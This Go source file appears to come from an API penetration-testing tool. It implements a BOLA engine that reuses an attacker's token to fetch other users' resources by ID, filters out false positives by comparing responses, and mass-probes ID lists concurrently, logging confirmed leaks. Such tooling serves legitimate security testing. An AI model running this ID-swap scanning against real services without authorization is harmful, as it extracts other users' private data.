package logic

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"path"
	"strings"
	"sync" // Used in MassProbe

	"github.com/JoseMariaMicoli/VaporTrace/pkg/db"
	"github.com/pterm/pterm"
)

// BOLAContext defines the parameters for an ID-swap attack
type BOLAContext struct {
	BaseURL       string
	VictimID      string
	AttackerID    string
	AttackerToken string
}

// getResource fetches a resource and returns status and body for comparison
func (b *BOLAContext) getResource(resourceID string, token string) (int, string, error) {
	u, err := url.Parse(b.BaseURL)
	if err != nil {
		return 0, "", err
	}
	u.Path = path.Join(u.Path, resourceID)
	target := u.String()

	req, _ := http.NewRequest("GET", target, nil)
	req.Header.Set("Authorization", fmt.Sprintf("Bearer %s", token))
	req.Header.Set("User-Agent", "VaporTrace/2.1.0 (Phase 9.4 Surgical)")

	// GlobalClient is defined in network.go
	// SafeDo (Phase 9.6) ensures traffic is mirrored for security team visibility
	resp, err := SafeDo(req, false, "BOLA-ENGINE") 
	if err != nil {
		return 0, "", err
	}
	defer resp.Body.Close()

	body, _ := io.ReadAll(resp.Body)
	return resp.StatusCode, string(body), nil
}

// ExecuteMassBOLA orchestrates concurrent probes across all identified targets (Phase 9.7)
func (b *BOLAContext) ExecuteMassBOLA(idList []string, concurrency int) {
	pterm.DefaultSection.Println("Phase 9.7: BOLA Concurrency Engine")
	
	var targets []string
	GlobalDiscovery.mu.Lock()
	for _, path := range GlobalDiscovery.Endpoints {
		// Identify targets with ID patterns like /user/{id} or /api/v1/orders/101
		if strings.Contains(path, "{") || strings.Contains(path, "id") {
			targets = append(targets, path)
		}
	}
	GlobalDiscovery.mu.Unlock()

	if len(targets) == 0 {
		pterm.Warning.Println("No BOLA-eligible targets found in the discovery pipeline.")
		return
	}

	for _, targetPath := range targets {
		pterm.Info.Printfln("Spawning worker pool for endpoint: %s", targetPath)
		b.BaseURL = targetPath
		b.MassProbe(idList, concurrency)
	}
}

// Probe handles a single, detailed BOLA analysis with UI feedback (Phase 9.2)
func (b *BOLAContext) Probe() {
	pterm.DefaultHeader.WithFullWidth(false).Println("Surgical BOLA Engine [PHASE 9.2]")

	activeToken := b.AttackerToken
	if activeToken == "" {
		activeToken = CurrentSession.AttackerToken
	}

	if activeToken == "" {
		pterm.Error.Println("No Attacker Token configured. Use 'auth attacker <token>'")
		return
	}

	var baselineBody string
	if b.AttackerID != "" {
		spinner, _ := pterm.DefaultSpinner.Start("Establishing Baseline (Attacker's own data)...")
		_, body, err := b.getResource(b.AttackerID, activeToken)
		if err == nil {
			baselineBody = body
			spinner.Success("Baseline established.")
		} else {
			spinner.Warning("Could not establish baseline. Falling back to status-only mode.")
		}
	}

	spinner, _ := pterm.DefaultSpinner.Start(fmt.Sprintf("Probing Victim ID: %s", b.VictimID))
	code, probeBody, err := b.getResource(b.VictimID, activeToken)

	if err != nil {
		spinner.Fail(fmt.Sprintf("Connection failed: %v", err))
		return
	}

	isVulnerable := false
	analysisMsg := ""

	if code == http.StatusOK {
		lowerBody := strings.ToLower(probeBody)
		isGenericError := strings.Contains(lowerBody, "not found") || strings.Contains(lowerBody, "error") || strings.Contains(lowerBody, "denied")

		if baselineBody != "" && probeBody == baselineBody {
			spinner.Warning("Potential False Positive: Server returned Attacker's own data.")
			analysisMsg = "Reflected self-data"
		} else if isGenericError {
			spinner.Warning("False Positive Filtered: 200 OK received but body indicates error.")
			analysisMsg = "Cloaked Error Message"
		} else {
			isVulnerable = true
			spinner.Success("VERIFIED BOLA VULNERABILITY")
		}
	}

	if isVulnerable {
		pterm.Warning.Prefix = pterm.Prefix{Text: "VULN", Style: pterm.NewStyle(pterm.BgRed, pterm.FgWhite)}
		pterm.Warning.Println("Unauthorized data extraction confirmed via Response Diffing.")

		pterm.DefaultTable.WithData(pterm.TableData{
			{"METRIC", "VALUE"},
			{"RESOURCE ID", b.VictimID},
			{"LEAK SIZE", fmt.Sprintf("%d bytes", len(probeBody))},
		}).WithBoxed().Render()

		db.LogQueue <- db.Finding{
			Phase:   "PHASE 9.2: SURGICAL BOLA",
			Target:  b.BaseURL + "/" + b.VictimID,
			Details: fmt.Sprintf("Confirmed BOLA on %s (Diff Verified)", b.VictimID),
			Status:  "EXPLOITED",
		}
	} else if code == 403 || code == 401 {
		spinner.Success("Target Secure (403 Forbidden)")
	} else {
		spinner.Stop()
		pterm.Info.Printfln("Result: %s", analysisMsg)
	}
}

// MassProbe implements the high-speed concurrent worker pool (Phase 9.7)
func (b *BOLAContext) MassProbe(idList []string, concurrency int) {
	pb, _ := pterm.DefaultProgressbar.WithTotal(len(idList)).WithTitle("Scanning IDs").Start()
	idChan := make(chan string, concurrency)
	var wg sync.WaitGroup

	// 1. Initialize Worker Pool
	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for id := range idChan {
				instance := *b // Local copy for thread-safety
				instance.VictimID = id
				instance.ProbeSilent() 
				pb.Increment()
			}
		}()
	}

	// 2. Distribute IDs to workers
	for _, id := range idList {
		idChan <- id
	}
	close(idChan)

	// 3. Finalize scan
	wg.Wait()
	pb.Stop()
	pterm.Success.Println("Mass scan completed successfully.")
}

// ProbeSilent provides a performance-optimized execution for mass scanning
func (b *BOLAContext) ProbeSilent() {
	activeToken := b.AttackerToken
	if activeToken == "" {
		activeToken = CurrentSession.AttackerToken
	}

	code, body, err := b.getResource(b.VictimID, activeToken)
	if err != nil || code != 200 { 
		return 
	}

	lowerBody := strings.ToLower(body)
	if strings.Contains(lowerBody, "not found") || strings.Contains(lowerBody, "error") { 
		return 
	}

	pterm.Warning.Prefix = pterm.Prefix{Text: "HIT", Style: pterm.NewStyle(pterm.BgRed, pterm.FgWhite)}
	pterm.Warning.Printfln(" BOLA HIT: %s/%s", b.BaseURL, b.VictimID)

	db.LogQueue <- db.Finding{
		Phase:   "PHASE III: AUTH LOGIC",
		Target:  b.BaseURL + "/" + b.VictimID,
		Details: "Automated BOLA mass-detection hit",
		Status:  "VULNERABLE",
	}
}